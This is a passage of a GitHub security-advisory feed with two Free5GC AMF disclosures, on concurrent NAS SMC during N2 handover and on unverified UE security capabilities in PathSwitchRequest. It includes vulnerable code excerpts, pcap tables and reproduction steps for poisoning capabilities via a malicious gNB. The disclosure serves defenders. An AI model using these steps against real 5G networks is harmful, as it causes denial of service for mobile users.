-        <title type="html"><![CDATA[[github.com/free5gc/amf] Free5GC AMF has Missing Concurrent NAS SMC Validation During NGAP Handover ]]></title>
-        <id>https://github.com/advisories/GHSA-vrrx-58h3-prmh</id>
-        <link href="https://github.com/advisories/GHSA-vrrx-58h3-prmh"/>
-        <updated>2026-05-07T02:39:15.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The AMF in Free5GC v4.2.1 does not enforce the concurrent security procedure rules defined in 3GPP TS 33.501 §6.9.5.1. The AMF does not check for ongoing N2 handover procedures before initiating a NAS Security Mode Command, and vice versa. This can lead to mismatches between NAS and AS security contexts in the network and the UE.</p>
-<h3 id="details">Details</h3>
-<p><strong>Vulnerability Type:</strong> CWE-358 (Improperly Implemented Security Check for Standard)</p>
-<p><strong>Affected File:</strong> <code>internal/ngap/handler.go</code> — <code>handleHandoverRequiredMain()</code> and <code>internal/gmm/sm.go</code> — <code>SecurityMode()</code></p>
-<p><strong>Root Cause:</strong></p>
-<p>3GPP TS 33.501 §6.9.5.1 states:</p>
-<blockquote>
-<p>"Concurrent runs of security procedures may, in certain situations, lead to mismatches between security contexts in the network and the UE. In order to avoid such mismatches, the following rules shall be adhered to:</p>
-<ol>
-<li>AMF shall not initiate any of the N2 procedures including a new key towards a UE if a NAS Security Mode Command procedure is ongoing with the UE.</li>
-<li>The AMF shall not initiate a NAS Security Mode Command towards a UE if one of the N2 procedures including a new key is ongoing with the UE."</li>
-</ol>
-</blockquote>
-<p>Free5GC AMF uses an <code>OnGoing</code> state tracking mechanism (<code>SetOnGoing()</code>, <code>GetOnGoing()</code>) with <code>OnGoingProcedureN2Handover</code> type. However, the cross-procedure checks required by §6.9.5.1 are not implemented:</p>
-<p><strong>Rule 2 violation:</strong>
-<code>SecurityMode()</code> in <code>internal/gmm/sm.go</code> sends SMC on <code>EntryEvent</code> without checking if N2 handover is ongoing.</p>
-<p><strong>Rule 1 violation:</strong>
-<code>handleHandoverRequiredMain()</code> in <code>internal/ngap/handler.go</code> calls <code>SetOnGoing(OnGoingProcedureN2Handover)</code> without checking if SMC is ongoing.</p>
-<p><strong>Why NH/NCC and SMC are related:</strong></p>
-<p>SMC activates a new KAMF, which changes the basis for NH key derivation. The N2 HandoverRequest includes NH/NCC derived from the old KAMF. If both procedures run concurrently, the target gNB and UE derive different KgNB keys, breaking AS security.</p>
-<h3 id="poc">PoC</h3>
-<p><strong>Source code evidence:</strong></p>
-<p>Free5GC AMF <code>internal/gmm/sm.go</code> — <code>SecurityMode()</code>:</p>
-<pre><code class="language-go">func SecurityMode(state *fsm.State, event fsm.EventType, args fsm.ArgsType) {
-    switch event {
-    case fsm.EntryEvent:
-        // No check for OnGoing N2 procedure
-        // Directly proceeds to SMC
-</code></pre>
-<p>Free5GC AMF <code>internal/ngap/handler.go</code> — <code>handleHandoverRequiredMain()</code>:</p>
-<pre><code class="language-go">amfUe.SetOnGoing(sourceUe.Ran.AnType, &amp;context.OnGoing{
-    Procedure: context.OnGoingProcedureN2Handover,
-})
-// No check for ongoing SMC before setting N2
-</code></pre>
-<p><strong>Packet Evidence (pcap available):</strong></p>
-<table>
-<thead>
-<tr>
-<th>Packet</th>
-<th>Time</th>
-<th>Message</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>#1</td>
-<td>0.000s</td>
-<td>HandoverRequired</td>
-<td>gNB_A requests handover</td>
-</tr>
-<tr>
-<td>#18</td>
-<td>0.002s</td>
-<td><strong>HandoverRequest</strong></td>
-<td><strong>N2 started (NH/NCC included)</strong></td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td><em>(no response from gNB_B)</em></td>
-<td><strong>N2 ongoing</strong></td>
-</tr>
-<tr>
-<td>#28</td>
-<td>2.062s</td>
-<td>Registration request</td>
-<td>UE re-registers (same SUPI)</td>
-</tr>
-<tr>
-<td>#63</td>
-<td>2.069s</td>
-<td>Authentication request</td>
-<td></td>
-</tr>
-<tr>
-<td>#64</td>
-<td>2.070s</td>
-<td>Authentication response</td>
-<td></td>
-</tr>
-<tr>
-<td>#71</td>
-<td>2.072s</td>
-<td><strong>Security mode command</strong></td>
-<td><strong>SMC during N2 ongoing = Rule 2 violation</strong></td>
-</tr>
-<tr>
-<td><a href="https://github.com/user-attachments/files/26735421/NGAPHandover-N2-SMC-Concurrent.zip">NGAPHandover-N2-SMC-Concurrent.zip</a></td>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-</tbody></table>
-<h3 id="impact">Impact</h3>
-<p><strong>Integrity (MEDIUM):</strong> Concurrent NAS and AS security procedures can cause security context mismatches between UE, AMF, and gNB. The SMC activates a new KAMF while the N2 HandoverRequest carries NH/NCC derived from the old KAMF, resulting in KgNB derivation mismatch.</p>
-<p><strong>Availability (LOW):</strong> Security context mismatch may cause handover failure or security verification failures.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/free5gc/free5gc/security/advisories/GHSA-vrrx-58h3-prmh">https://github.com/free5gc/free5gc/security/advisories/GHSA-vrrx-58h3-prmh</a></li>
-<li><a href="https://github.com/free5gc/amf/blame/v1.4.3/internal/gmm/sm.go">https://github.com/free5gc/amf/blame/v1.4.3/internal/gmm/sm.go</a></li>
-<li><a href="https://github.com/free5gc/amf/blame/v1.4.3/internal/ngap/handler.go">https://github.com/free5gc/amf/blame/v1.4.3/internal/ngap/handler.go</a></li>
-<li><a href="https://github.com/advisories/GHSA-vrrx-58h3-prmh">https://github.com/advisories/GHSA-vrrx-58h3-prmh</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-vrrx-58h3-prmh</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-05-07T01:56:13.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/free5gc/amf] Free5GC AMF Bypasses UE Security Capabilities on NGAP PathSwitchRequest]]></title>
-        <id>https://github.com/advisories/GHSA-77x9-rf64-92gv</id>
-        <link href="https://github.com/advisories/GHSA-77x9-rf64-92gv"/>
-        <updated>2026-05-07T02:39:17.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The AMF in Free5GC v4.2.1 does not verify the UE Security Capabilities received in NGAP PathSwitchRequest messages against its locally stored values, as mandated by 3GPP TS 33.501 §6.7.3.1. A malicious gNB can overwrite the AMF's stored UE security capabilities with arbitrary values, which are then propagated in PathSwitchRequest Acknowledge messages and subsequent Handover Request messages. This leads to persistent handover denial-of-service for affected UEs.</p>
-<h3 id="details">Details</h3>
-<p><strong>Affected File:</strong> <code>amf/internal/ngap/handler.go</code> — <code>handlePathSwitchRequestMain</code> function</p>
-<p><strong>Root Cause:</strong></p>
-<p>When the AMF receives a PathSwitchRequest during an Xn-handover, it processes the UESecurityCapabilities IE by directly overwriting the stored values without comparing them to the previously stored capabilities:</p>
-<pre><code class="language-go">if uESecurityCapabilities != nil {
-    amfUe.UESecurityCapability.SetEA1_128_5G(uESecurityCapabilities.NRencryptionAlgorithms.Value.Bytes[0] &amp; 0x80)
-    amfUe.UESecurityCapability.SetEA2_128_5G(uESecurityCapabilities.NRencryptionAlgorithms.Value.Bytes[0] &amp; 0x40)
-    amfUe.UESecurityCapability.SetEA3_128_5G(uESecurityCapabilities.NRencryptionAlgorithms.Value.Bytes[0] &amp; 0x20)
-    amfUe.UESecurityCapability.SetIA1_128_5G(uESecurityCapabilities.NRintegrityProtectionAlgorithms.Value.Bytes[0] &amp; 0x80)
-    amfUe.UESecurityCapability.SetIA2_128_5G(uESecurityCapabilities.NRintegrityProtectionAlgorithms.Value.Bytes[0] &amp; 0x40)
-    amfUe.UESecurityCapability.SetIA3_128_5G(uESecurityCapabilities.NRintegrityProtectionAlgorithms.Value.Bytes[0] &amp; 0x20)
-}
-</code></pre>
-<p><strong>3GPP TS 33.501 §6.7.3.1 requires three actions, none of which are implemented:</strong></p>
-<ol>
-<li><p><strong>Verification (SHALL):</strong> "The AMF shall verify that the UE's 5G security capabilities received from the target gNB/ng-eNB are the same as the UE's 5G security capabilities that the AMF has locally stored."
-→ Not implemented. The AMF unconditionally overwrites stored values.</p>
-</li>
-<li><p><strong>Correction (SHALL):</strong> "If there is a mismatch, the AMF shall send its locally stored 5G security capabilities of the UE to the target gNB/ng-eNB in the Path-Switch Acknowledge message."
-→ Not implemented. The PathSwitchRequestAcknowledge contains the corrupted values.</p>
-</li>
-<li><p><strong>Logging (SHALL):</strong> "The AMF shall support logging capabilities for this event and may take additional measures, such as raising an alarm."
-→ Not implemented. No mismatch detection or logging exists.</p>
-</li>
-</ol>
-<p><strong>Propagation:</strong></p>
-<p>The corrupted values are propagated in:</p>
-<ul>
-<li><strong>PathSwitchRequestAcknowledge:</strong> Contains corrupted UESecurityCapabilities (demonstrated in pcap)</li>
-<li><strong>Subsequent HandoverRequest messages:</strong> AMF sends corrupted capabilities to target gNBs</li>
-</ul>
-<p>Per TS 38.413 §8.4.2.4, if the supported algorithms in the UE Security Capabilities do not match any allowed algorithms configured in the target gNB, the target gNB is required to reject the procedure using a HANDOVER FAILURE message.</p>
-<h3 id="poc">PoC</h3>
-<p><strong>Environment:</strong></p>
-<ul>
-<li>Free5GC v4.2.1 AMF (Docker container) with full NF stack (NRF, AUSF, UDM, UDR, NSSF, PCF, SMF, UPF)</li>
-<li>UERANSIM v3.2.7 gNB with custom inspection-tool extension</li>
-<li>tshark for packet capture</li>
-</ul>
-<p><strong>Reproduction Steps:</strong></p>
-<ol>
-<li><p>Start Free5GC full stack and register a UE through a gNB (NG Setup → Registration → PDU Session Setup).</p>
-</li>
-<li><p>Send a normal HandoverRequired from the gNB. Capture the resulting HandoverRequest from the AMF and confirm <code>nRintegrityProtectionAlgorithms = 0xe000</code> (NIA1, NIA2, NIA3 all supported). This is the baseline.</p>
-</li>
-<li><p>Send a PathSwitchRequest with <code>nRintegrityProtectionAlgorithms = 0x0000</code> (all integrity algorithms set to not supported). The AMF responds with PathSwitchRequestAcknowledge.</p>
-</li>
-<li><p>Observe that the PathSwitchRequestAcknowledge contains <code>nRintegrityProtectionAlgorithms = 0x0000</code> — the corrupted values are propagated back.</p>
-</li>
-</ol>
-<p><strong>Observed Result (from pcap capture):</strong></p>
-<table>
-<thead>
-<tr>
-<th>Packet</th>
-<th>Message</th>
-<th>nRintegrityProtectionAlgorithms</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>#20</td>
-<td>HandoverRequest (AMF→gNB)</td>
-<td><code>0xe000</code> (NIA1 ✓ NIA2 ✓ NIA3 ✓) — <strong>baseline</strong></td>
-</tr>
-<tr>
-<td>#30</td>
-<td>PathSwitchRequest (gNB→AMF)</td>
-<td><code>0x0000</code> — <strong>poison</strong></td>
-</tr>
-<tr>
-<td>#47</td>
-<td>PathSwitchRequestAcknowledge (AMF→gNB)</td>
-<td><code>0x0000</code> (NIA1 ✗ NIA2 ✗ NIA3 ✗) — <strong>corrupted</strong></td>
-</tr>
-</tbody></table>
-<h3 id="impact">Impact</h3>
-<p><strong>Availability (HIGH):</strong> A malicious gNB can send a single PathSwitchRequest message to corrupt the AMF's stored UE security capabilities for any UE. All subsequent inter-gNB handovers for the affected UE are expected to fail (per TS 38.413 §8.4.2.4), resulting in denial-of-service that persists until the UE performs a new registration.</p>
-<p><strong>Integrity (LOW):</strong> The AMF's internal UE security context is corrupted with attacker-controlled values. These corrupted values are propagated to other network elements via PathSwitchRequestAcknowledge and HandoverRequest messages.</p>
-<p><strong>Who is impacted:</strong> Any deployment using Free5GC as the AMF where a gNB could be compromised or where untrusted gNBs exist (e.g., O-RAN multi-vendor deployments).</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/free5gc/free5gc/security/advisories/GHSA-77x9-rf64-92gv">https://github.com/free5gc/free5gc/security/advisories/GHSA-77x9-rf64-92gv</a></li>
-<li><a href="https://github.com/free5gc/amf/blame/v1.4.3/internal/ngap/handler.go">https://github.com/free5gc/amf/blame/v1.4.3/internal/ngap/handler.go</a></li>
-<li><a href="https://github.com/advisories/GHSA-77x9-rf64-92gv">https://github.com/advisories/GHSA-77x9-rf64-92gv</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-77x9-rf64-92gv</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-05-07T01:53:47.000Z</published>
     </entry>
 </feed>
